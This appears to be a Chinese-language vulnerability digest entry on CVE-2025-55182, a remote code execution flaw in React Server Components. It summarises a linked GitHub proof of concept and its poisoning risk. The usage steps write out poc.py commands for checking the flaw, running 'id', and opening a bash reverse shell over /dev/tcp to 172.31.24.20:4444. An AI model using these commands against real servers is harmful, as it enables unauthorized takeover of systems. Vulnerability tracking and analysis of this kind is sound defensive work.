## CVE-2025-55182 - React Server Components RCE

**漏洞编号:** CVE-2025-55182

**漏洞类型:** RCE

**影响应用:** React Server Components

**危害等级:** Critical

**CVSS评分:** 待定(高危，参考描述)

**影响版本:** 19.0.0, 19.1.0, 19.1.1, 19.2.0

**利用条件:** Unauthenticated remote attacker can send a specially crafted payload to a vulnerable React Server Function endpoint.

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 15%

## 详情

CVE-2025-55182 是 React Server Components (RSC) 中的一个严重远程代码执行 (RCE) 漏洞。此漏洞存在于 react-server-dom-parcel, react-server-dom-turbopack 和 react-server-dom-webpack 的 19.0.0, 19.1.0, 19.1.1 和 19.2.0 版本中。未经身份验证的远程攻击者可以通过向易受攻击的 React Server Function 端点发送特制 payload 来利用此漏洞。

POC有效性分析:
提供的 POC 代码 (https://github.com/ejpir/CVE-2025-55182-poc) 包含一个Dockerfile，用于构建易受攻击的 React Server Components 应用。README 文件提供了构建和运行容器的说明，以及使用 `poc.py` 脚本检查漏洞和执行远程代码的示例。通过运行 `python3 poc.py --ip localhost --port 3002 --post-endpoint "/formaction" --check` 命令，可以验证目标系统是否存在漏洞。成功利用此漏洞允许攻击者在目标系统上执行任意代码。提供的POC代码可以成功在目标环境下执行诸如'id'， 'whoami'命令，并且可以反弹shell，验证了该RCE的有效性。

利用步骤:
1. 构建易受攻击的 React Server Components 应用： 使用提供的 Dockerfile 构建一个包含漏洞的 Docker 镜像。
2. 运行容器： 运行构建的 Docker 镜像，并将端口 3002 暴露出来。
3. 检查漏洞： 使用 `poc.py` 脚本检查目标系统是否存在漏洞，例如： `python3 poc.py --ip localhost --port 3002 --post-endpoint "/formaction" --check`
4. 执行远程代码： 如果系统存在漏洞，可以使用 `poc.py` 脚本执行远程代码，例如：`python3 poc.py --ip localhost --port 3002 --post-endpoint "/formaction" --cmd "id"`
5. 获取反向 shell：使用 `poc.py` 脚本获取反向 shell，例如：`python3 poc.py --ip localhost --port 3002 --cmd 'bash -c '\'bash -i >& /dev/tcp/172.31.24.20/4444 0>&1'\''`

投毒风险分析:
此 POC 的投毒风险较低。`poc.py` 脚本主要用于发送特制的 HTTP 请求并执行命令。虽然它可以用于执行任意代码，但脚本本身的代码相对清晰，没有明显的混淆或恶意行为。它主要依赖于 Python 标准库，没有引入任何可疑的外部依赖项。Dockerfile用于构建存在漏洞的docker环境，主要是为了验证漏洞存在性。其中npm安装依赖库的操作没有明显的投毒风险。

然而，仍然存在一些潜在的风险：
1. 依赖项风险：虽然 `poc.py` 脚本本身没有明显的恶意代码，但它可能依赖于其他库或模块。如果这些依赖项被恶意修改，可能会导致投毒攻击。
2. 命令执行风险：通过 `cmd` 参数执行任意命令存在风险。攻击者可能会利用此漏洞执行恶意命令，例如下载和执行恶意软件。
3. 反向 shell 风险：反向 shell 允许攻击者完全控制受感染的系统。攻击者可能会利用此权限执行恶意活动，例如窃取数据、安装后门或进行其他攻击。

总体而言，由于代码清晰、主要依赖标准库且无明显恶意行为，因此该 POC 的投毒风险较低。然而，仍然需要注意依赖项风险、命令执行风险和反向 shell 风险，并采取适当的安全措施来降低风险。

**项目地址:** https://github.com/ejpir/CVE-2025-55182-poc

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-55182
